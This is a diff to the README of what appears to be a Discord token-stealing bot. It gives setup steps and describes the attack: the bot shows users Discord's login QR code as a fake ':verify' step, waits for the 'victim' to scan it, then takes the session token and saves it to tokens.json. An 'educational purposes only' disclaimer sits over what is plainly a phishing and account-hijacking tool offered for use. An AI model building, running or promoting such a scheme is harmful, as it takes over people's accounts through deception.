@@ -20,7 +20,7 @@ pip install -r requirements.txt
 DISCORD_BOT_TOKEN="Your Discord Bot Token"
 ```
 
-4. Install firefox
+4. Install firefox<br>
 The script uses firefox browser to handle interactions with discord.
 
 5. Run the script
@@ -28,8 +28,8 @@ The script uses firefox browser to handle interactions with discord.
 python main.py
 ```
 
-Whenever someone types `:verify` in the chat. The bot will create a browser instance (firefox) and take the qr code from discord's login page. The bot will then send the victim a message to verify their account by scanning the qr code from discord mobile. Once scanned, the bot will retrive the token from session storage, check the token against discord, if the token is real, it will save the token in a `tokens.json` file.
+Whenever someone types `:verify` in the chat. The bot will create a browser instance (firefox) and take the qr code from discord's login page. The bot will then send the victim a message to verify their account by scanning the qr code using discord mobile. Once scanned, the bot will retrive the token from session storage, check the token against discord, if the token is real, it will save the token in a `tokens.json` file.
 
 
 <h2>Warning</h2>
-This project is for educational purposes only, I do not take any responsibilty if you break discord's TOS without their or someone's consent.
+This project is for educational purposes only, I do not take any responsibilty if you break discord's TOS without their and someone's consent.
